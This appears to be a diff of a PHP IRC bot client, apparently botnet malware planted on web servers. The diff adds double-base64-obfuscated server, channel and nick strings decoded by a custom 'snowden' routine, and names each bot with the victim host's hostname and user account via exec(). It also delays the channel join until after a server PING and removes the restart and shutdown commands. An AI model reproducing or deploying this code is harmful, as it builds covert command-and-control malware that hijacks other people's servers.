@@ -3,22 +3,19 @@
 set_time_limit(0);
 ini_set('display_errors', 'on');
 
-
-
 $config = array( 
-        'server' => snowden('UFVZSFQwb3NXMXNuRWxCYg=='), 
+        'server' => snowden('SVI4dkdFTkZKeFVxUml3a2VGNDdLdz09'), 
         'port'   => 6667, 
-        'channel' => snowden('#butt'),
-        'name'   => snowden('buttBot_').$_SERVER['SERVER_ADDR'], 
-        'nick'   => snowden('buttBot_').$_SERVER['SERVER_ADDR'], 
+        'channel' => snowden('YXc4NVFsND0='),
+        'name'   => snowden('S2hnNFFtaFlNRGs9').exec('hostname').'-'.exec('whoami').'-'.strval(rand(1,1000)), 
+        'nick'   => snowden('S2hnNFFtaFlNRGs9').exec('hostname').'-'.exec('whoami').'-'.strval(rand(1,1000)), 
         'pass'   => snowden(''), 
 );
-
 
                                  
 function snowden($string) {
 
- $white = base64_decode(base64_decode('VkRSa1lTTmVPQ2hJWnp3aA=='));
+ $white = base64_decode(base64_decode('U0cxTU5pbzNSR1pGTTBCZVZqRkpURWx1WHk0K1YwQnJNMVZ3S1FvPQo='));
  $text = base64_decode(base64_decode($string));
  $black = '';
 
@@ -32,14 +29,14 @@ function snowden($string) {
 class buttBOT {
 
         var $socket;
-
         var $buf = array();
-
+	var $pongCount = 0;
+	var $joined = false;
         // @param array
         function __construct($config)
 
         {
-                $this->socket = fsockopen($config['server'], $config['port']);
+		$this->socket = fsockopen($config['server'], $config['port']);
                 $this->login($config);
                 $this->main($config);
         }
@@ -52,7 +49,7 @@ class buttBOT {
         {
                 $this->send_data('USER', $config['nick'].' null '.$config['nick'].' :'.$config['name']);
                 $this->send_data('NICK', $config['nick']);
-		$this->join_channel($config['channel']);
+//		$this->join_channel($config['channel']);
         }
 
 
@@ -61,9 +58,8 @@ class buttBOT {
         function main($config)
         {             
                 $data = fgets($this->socket, 256);
-                
-                echo nl2br($data);
-				
+                //debug
+                echo nl2br($data);		
                 flush();
 
                 $this->buf = explode(' ', $data);
@@ -71,8 +67,14 @@ class buttBOT {
 
                 if($this->buf[0] == 'PING')
                 {
-                        $this->send_data('PONG', $this->buf[1]); 
+                        $this->send_data('PONG', $this->buf[1]);
+			$this->pongCount++;
                 }
+		if(($this->pongCount >= 1) && ($this->joined == false))
+		{
+			$this->join_channel($config['channel']);
+			$this->joined = true;
+		}
 
                 $command = str_replace(array(chr(10), chr(13)), '', $this->buf[3]);
 
@@ -95,12 +97,6 @@ class buttBOT {
                                 $this->send_data('PRIVMSG '.$this->buf[4].' :', $message);
                                 break;                        		
                         
-                        case ':!restart':
-                                echo "<meta http-equiv=\"refresh\" content=\"5\">";
-                                exit;
-                        case ':!shutdown':
-                        		$this->send_data('QUIT', 'we out');
-                                exit;
                 }
 
                 $this->main($config);
